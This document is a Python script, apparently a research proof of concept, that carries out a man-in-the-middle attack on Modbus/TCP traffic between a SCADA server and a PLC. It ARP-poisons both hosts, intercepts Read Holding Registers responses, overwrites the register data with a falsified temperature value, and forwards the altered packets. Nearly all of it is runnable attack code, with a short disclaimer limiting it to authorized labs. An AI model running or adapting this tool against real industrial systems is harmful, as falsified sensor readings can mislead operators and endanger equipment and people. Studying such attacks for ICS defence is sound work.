#!/usr/bin/env python3
"""
ModbusInjector.py

Man-In-The-Middle (MITM) attack tool for Modbus/TCP protocol in ICS environments.

This proof-of-concept demonstrates vulnerabilities in unencrypted Modbus communications:
- ARP spoofing to position attacker between SCADA and PLC
- Real-time packet interception and modification
- Injection of falsified sensor readings

WARNING: FOR AUTHORIZED SECURITY RESEARCH ONLY
This tool must only be used in controlled laboratory environments with explicit authorization.

Requirements:
  - Root/Administrator privileges
  - scapy library
  - python-dotenv for configuration
  - Isolated test network

Usage:
  sudo python ModbusInjector.py

Research Context:
  Demonstrates the critical security gap in legacy Modbus/TCP implementations
  that lack encryption, authentication, and integrity verification.
"""

from scapy.all import *
import sys
import time
import threading
import os
from pathlib import Path

# Load environment variables
try:
    from dotenv import load_dotenv
    # Load .env from project root
    env_path = Path(__file__).parent.parent / '.env'
    load_dotenv(dotenv_path=env_path)
    print("✓ Environment variables loaded")
except ImportError:
    print("⚠ python-dotenv not installed. Install with: pip install python-dotenv")
    print("⚠ Cannot proceed without configuration")
    sys.exit(1)

# --- CONFIGURATION ---
SCADABR_IP = os.getenv("SCADABR_IP", "192.168.0.101")
PLC_IP = os.getenv("PLC_IP", "192.168.0.102")
ATTACKER_MAC = os.getenv("ATTACKER_MAC", "XX:XX:XX:XX:XX:XX")

# Value to inject: 1234 (e.g., 123.4°C if scaling is 0.1)
TEMP_VAL = int(os.getenv("TEMP_VAL", "1234")) 

# --- NETWORK INTERFACE SELECTION ---
IFACE_OBJ = None
for iface in conf.ifaces.values():
    if "Intel" in iface.description and "AX211" in iface.description:
        IFACE_OBJ = iface
        break

if not IFACE_OBJ:
    print("[!] Intel network adapter not found."); sys.exit(1)

MY_IFACE = IFACE_OBJ

# --- ARP SPOOFING FUNCTIONS ---
def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0, iface=MY_IFACE)
    if ans: return ans[0][1].hwsrc
    return None

scadabr_mac = get_mac(SCADABR_IP)
plc_mac = get_mac(PLC_IP)

def arp_poison():
    pkt_scada = Ether(dst=scadabr_mac)/ARP(op=2, pdst=SCADABR_IP, hwdst=scadabr_mac, psrc=PLC_IP, hwsrc=ATTACKER_MAC)
    pkt_plc = Ether(dst=plc_mac)/ARP(op=2, pdst=PLC_IP, hwdst=plc_mac, psrc=SCADABR_IP, hwsrc=ATTACKER_MAC)
    sendp(pkt_scada, verbose=0, iface=MY_IFACE)
    sendp(pkt_plc, verbose=0, iface=MY_IFACE)

def restore_arp():
    sendp(Ether(dst=scadabr_mac)/ARP(op=2, pdst=SCADABR_IP, hwdst=scadabr_mac, psrc=PLC_IP, hwsrc=plc_mac), count=5, verbose=0, iface=MY_IFACE)
    sendp(Ether(dst=plc_mac)/ARP(op=2, pdst=PLC_IP, hwdst=plc_mac, psrc=SCADABR_IP, hwsrc=scadabr_mac), count=5, verbose=0, iface=MY_IFACE)

# --- MODBUS PACKET MODIFICATION LOGIC ---
def modify_modbus(pkt):
    if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
        return

    if pkt[TCP].sport == 502 or pkt[TCP].dport == 502:
        payload = bytearray(pkt[Raw].load)
        
        # Intercept RESPONSES (from PLC to ScadaBR)
        if pkt[IP].src == PLC_IP and len(payload) >= 11:
            function_code = payload[7]  # Function Code is at byte 8 (index 7)
            
            # FC 03: Read Holding Registers
            if function_code == 0x03:
                byte_count = payload[8]  # Next byte indicates how many data bytes follow
                
                # If ScadaBR is reading register 1024, data starts at bytes 9 and 10
                print(f"[*] Intercepted Holding Register read! Overwriting with {TEMP_VAL}")
                
                # Insert value in Big-Endian format (MSB, LSB)
                payload[9] = (TEMP_VAL >> 8) & 0xFF   # Most significant byte
                payload[10] = TEMP_VAL & 0xFF          # Least significant byte
                
                pkt[Raw].load = bytes(payload)

        # MANUAL FORWARDING (Required on Windows)
        if pkt[IP].src == SCADABR_IP:
            pkt[Ether].src = ATTACKER_MAC
            pkt[Ether].dst = plc_mac
        elif pkt[IP].src == PLC_IP:
            pkt[Ether].src = ATTACKER_MAC
            pkt[Ether].dst = scadabr_mac

        # Mandatory checksum recalculation after data modification
        del pkt[IP].len
        del pkt[IP].chksum
        del pkt[TCP].chksum
        
        sendp(pkt, verbose=0, iface=MY_IFACE)

# --- EXECUTION ---
threading.Thread(target=lambda: (time.sleep(1), [arp_poison() or time.sleep(2) for _ in iter(int, 1)]), daemon=True).start()

print(f"[*] MITM attack running. Modifying Offset 1024 on {MY_IFACE.description}")
print(f"[*] Target network: {SCADABR_IP} <-> {PLC_IP}")
print(f"[*] Injection value: {TEMP_VAL}")
print(f"[*] Press Ctrl+C to stop")
try:
    sniff(iface=MY_IFACE, filter=f"tcp port 502 and (host {SCADABR_IP} or host {PLC_IP})", prn=modify_modbus, store=0)
except KeyboardInterrupt:
    restore_arp()
    print("\n[*] Attack stopped. ARP tables restored.")